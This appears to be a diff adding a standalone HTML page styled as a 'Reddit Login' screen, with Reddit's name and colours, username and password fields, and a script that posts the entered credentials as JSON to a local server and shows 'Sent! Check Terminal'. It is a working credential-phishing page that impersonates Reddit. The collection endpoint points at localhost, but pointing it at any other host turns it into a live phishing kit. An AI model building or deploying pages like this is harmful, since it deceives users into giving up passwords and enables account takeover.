@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reddit Login</title>
+    <style>
+        body { font-family: Arial; background: #0F1A1F; color: white; }
+        .box { max-width: 400px; margin: 100px auto; padding: 30px; background: #1A282F; border-radius: 12px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #0F1A1F; border: 1px solid #555; color: white; border-radius: 6px; }
+        button { width: 100%; padding: 14px; background: #FF4500; color: white; border: none; border-radius: 50px; font-size: 16px; }
+        #status { text-align: center; margin-top: 15px; color: lime; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="text-align:center;">Reddit</h2>
+        
+        <form id="form">
+            <input type="text" id="user" placeholder="Username" required>
+            <input type="password" id="pass" placeholder="Password" required>
+            <button type="submit">Reddit</button>
+        </form>
+        
+        <div id="status"></div>
+    </div>
+
+    <script>
+        document.getElementById('form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('user').value;
+            const password = document.getElementById('pass').value;
+            
+            document.getElementById('status').textContent = "Sending to server...";
+
+            try {
+                const res = await fetch('http://localhost:8000/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                if (res.ok) {
+                    document.getElementById('status').innerHTML = "✅ Sent! Check Terminal";
+                }
+            } catch(err) {
+                document.getElementById('status').innerHTML = "❌ Failed to connect to server";
+            }
+        });
+    </script>
+</body>
+</html>
